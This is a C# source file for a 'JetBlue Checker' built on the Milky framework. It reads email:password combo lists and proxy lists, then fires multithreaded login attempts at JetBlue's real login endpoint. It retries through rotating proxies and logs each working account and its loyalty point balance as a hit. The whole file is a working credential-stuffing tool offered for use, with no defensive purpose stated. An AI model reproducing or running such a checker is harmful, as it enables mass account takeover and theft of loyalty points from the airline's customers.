using Milky.Objects;
using MilkyNet;
using Newtonsoft.Json;
using System;
using System.Threading;
using System.Threading.Tasks;
using static Milky.Output.OutputSettings;

namespace JetBlue_Checker
{
    class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            MilkyManager Milky = new MilkyManager();
            Milky.ProgramManager.Initialize("JetBlue Checker", "1.0.0", "Laiteux", "https://pastebin.com/raw/QW82zeqi");

            int threads = Milky.UserUtils.AskInteger("Threads");
            Milky.RunSettings.threads = threads;
            ThreadPool.SetMinThreads(threads, threads);

            Milky.RunSettings.proxyProtocol = Milky.UserUtils.AskChoice("Proxy Protocol", new string[] { "HTTP", "SOCKS4", "SOCKS5" });

            Milky.ConsoleSettings.runningTitleFormat =
                $"%program.name% %program.version% by %program.author% – Running | " +
                $"Ran : %run.ran% (%run.ran.percentage%) – Remaining : %run.remaining% – Hits : %run.hits% (%run.hits.percentage%) – Total Points : %custom.Total_Points% | " +
                $"RPM : %statistics.rpm% – Elapsed : %statistics.elapsed% – Estimated : %statistics.estimated%";
            Milky.ConsoleSettings.finishedTitleFormat =
                $"%program.name% %program.version% by %program.author% – Finished | " +
                $"Ran : %run.ran% – Hits : %run.hits% (%run.hits.percentage%) – Total Points : %custom.Total_Points% | " +
                $"Elapsed : %statistics.elapsed%";

            Milky.FileUtils.LoadCombos("Email:Password");
            Milky.FileUtils.LoadProxies(Milky.RunSettings.proxyProtocol);

            Milky.CustomStatistics.AddCustomStatistic("Total Points");

            Milky.RunManager.StartRun();

            Parallel.ForEach(Milky.RunLists.combos, new ParallelOptions { MaxDegreeOfParallelism = Milky.RunSettings.threads }, combo =>
            {
                string[] splittedCombo = combo.Split(':');

                ResultType resultType = ResultType.Invalid;
                CaptureDictionary captures = new CaptureDictionary();

                if (splittedCombo.Length == 2)
                {
                    string login = splittedCombo[0];
                    string password = splittedCombo[1];

                    while (resultType == ResultType.Invalid)
                    {
                        MilkyRequest request = Milky.RequestUtils.SetProxy(new MilkyRequest());

                        try
                        {
                            request.AddHeader("Content-Type", "application/json");

                            string response = Milky.RequestUtils.Execute(request,
                                HttpMethod.POST, "https://jbrest.jetblue.com/iam/login/",
                                "{\"id\":\"" + login + "\",\"pwd\":\"" + password + "\"}").ToString();
                            dynamic json = JsonConvert.DeserializeObject(response);

                            if (response.Contains("{\"points\""))
                            {
                                int points = int.Parse((string)json.points);
                                Milky.CustomStatistics.IncrementCustomStatistic("Total Points", points);
                                captures.Add("Points", points.ToString());

                                resultType = points == 0 ? ResultType.Free : ResultType.Hit;
                            }
                            else if (response.Contains("JB_INVALID_CREDENTIALS") || response.Contains("{\"name\"") || response.Contains("{\"httpStatus\":\"424\""))
                                break;
                        }
                        catch { }

                        request.Dispose();
                    }
                }

                Milky.RunManager.SubmitComboResult(combo, resultType, captures);
            });

            Milky.RunManager.FinishRun();

            Thread.Sleep(-1);
        }
    }
}
